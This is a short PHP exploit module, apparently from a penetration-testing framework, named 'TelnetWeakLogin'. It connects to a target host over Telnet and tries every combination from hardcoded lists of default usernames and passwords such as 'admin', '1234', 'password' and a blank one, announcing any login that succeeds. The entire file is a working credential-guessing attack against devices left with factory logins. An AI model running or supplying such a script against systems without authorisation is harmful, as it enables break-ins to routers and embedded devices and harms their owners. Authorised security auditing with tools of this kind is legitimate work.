<?php
class TelnetWeakLogin extends Exploit {

	function run(){
		$users = array("admin", "1234");
		$passwords = array("1234", "admin", "pass", "password", "", "sysadm");
		$t = new Telnet();
		echoCli("Trying to connect...", "notice");
		$con = $t->Connect($this->host->ipAdress, $this->port);
		if($con==true){
			echoCli("Connected!", "success");
			foreach($users as $user){
				foreach($passwords as $password){
					echoCli("Trying to login with: ".$user.":".$password, "notice");
					$res = $t->LogIn($user, $password);
					if($res==true){
						echoCli("Login found! ".$user.":".$password, "success");
						return true;
					}
				}
			}
		}else{
			echoCli("Cannot connect", "failure");
		}
	}
}
?>